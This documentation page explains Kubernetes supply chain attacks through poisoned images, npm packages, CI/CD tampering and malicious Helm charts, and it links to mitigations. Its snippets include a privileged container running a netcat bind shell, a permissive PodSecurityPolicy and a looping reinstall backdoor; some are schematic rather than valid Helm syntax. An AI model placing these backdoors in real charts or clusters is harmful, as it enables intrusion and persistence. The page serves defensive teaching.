---
sidebar_position: 6
title: "Supply Chain Attacks"
description: "How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."
keywords: [kubernetes security, supply chain attack, container image security, malicious images, CI/CD security, helm chart security, image scanning, artifact signing, cosign, notary]
tags: [attack-vector, supply-chain, images, CKS]
related:
  - /docs/best_practices/supply_chain_security/supply_chain_best_practices/
  - /docs/best_practices/supply_chain_security/cosign/
  - /docs/best_practices/supply_chain_security/syft/
  - /docs/best_practices/monitoring_logging_and_runtime_security/trivy/
---

# Supply Chain Attacks

Supply chain attacks in Kubernetes target the **container build process, dependencies, CI/CD pipelines, or Helm charts** to introduce malicious components into your cluster. These attacks can lead to **unauthorized access, persistent backdoors, and data exfiltration**.

---

## Exploitation Steps: Poisoning the Software Supply Chain

An attacker compromises the cluster by introducing malicious components during the software delivery lifecycle.

### 1. Publish a Malicious Container Image

The attacker creates and pushes a backdoored image to a public registry:

```bash
docker build -t attacker/malicious-app .
docker push docker.io/attacker/malicious-app
```

---

### 2. Deploy Unverified Image in Production

A Kubernetes workload unknowingly uses the attacker’s image:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  template:
    spec:
      containers:
        - name: app
          image: docker.io/attacker/malicious-app
```

No signature validation or source verification is performed.

---

### 3. Inject Malicious Dependencies

The attacker publishes a compromised package:

```bash
npm publish compromised-library
```

It is pulled automatically by an unsuspecting developer into a container image, enabling **remote code execution** in production.

---

### 4. Tamper with the CI/CD Pipeline

The attacker steals CI secrets and modifies manifests:

```bash
kubectl apply -f attacker-modified-deployment.yaml
```

This injects malicious logic into deployments automatically.

---

## Exploitation Steps: Deploying a Malicious Helm Chart

Helm charts offer another attack surface for supply chain compromise.

### 1. Publish a Malicious Helm Chart

The attacker embeds a backdoor in a Helm chart:

```yaml
containers:
  - name: backdoor-container
    image: attacker/malicious-image
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c"]
    args: ["while true; do nc -lvp 9001 -e /bin/sh; done"]
```

They then push it to a public repository:

```bash
helm package malicious-app
helm push malicious-app-1.0.0.tgz oci://public-helm-repo
```

---

### 2. Install Chart Without Verification

A user installs the chart without checking provenance:

```bash
helm repo add untrusted-repo oci://public-helm-repo
helm install vulnerable-app untrusted-repo/malicious-app
```

The **malicious workload** is now running.

---

### 3. Bypass Pod Security Policies

The attacker escalates privileges through insecure templates:

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: privileged-psp
spec:
  privileged: true
  runAsUser:
    rule: RunAsAny
  seLinux:
    rule: RunAsAny
```

They enable this at install:

```bash
helm install --set securityPolicy.privileged=true exploit-app
```

---

### 4. Maintain Persistence After Uninstall

A Helm hook ensures the backdoor remains:

```yaml
hooks:
  post-delete:
    - exec:
        command:
          [
            "/bin/sh",
            "-c",
            "while true; do sleep 60; kubectl apply -f /tmp/hidden-backdoor.yaml; done",
          ]
```

Even if the user runs:

```bash
helm uninstall exploit-app
```

The malicious deployment **reinstalls itself**.

---

### Result

The attacker successfully compromises the Kubernetes cluster via supply chain vectors, enabling:

- Deployment of malicious containers and packages
- Privilege escalation
- Long-term persistence
- CI/CD pipeline abuse

---

## Mitigation

➡ [Securing the Kubernetes Supply Chain](/docs/best_practices/supply_chain_security/intro)

---

import BookRecommendation from '@site/src/components/BookRecommendation';

<BookRecommendation
  asin="B0F17KHFTL"
  title="Docker and Kubernetes Security"
  author="Mohammad-Ali A'râbi"
  context="Covers supply chain security in depth, including SBOMs, image hardening, vulnerability scanning with Trivy and Snyk, and CI/CD pipeline security. Directly relevant to defending against the attacks described in this article."
/>

---

## References

This article is based on information from the following official sources:

1. [Supply Chain Security](https://kubernetes.io/docs/concepts/security/supply-chain-security/) - Kubernetes Documentation
2. [Sigstore](https://www.sigstore.dev/) - Sigstore Project
3. [SLSA Framework](https://slsa.dev/) - Supply-chain Levels for Software Artifacts
4. [Helm Provenance and Integrity](https://helm.sh/docs/topics/provenance/) - Helm Documentation
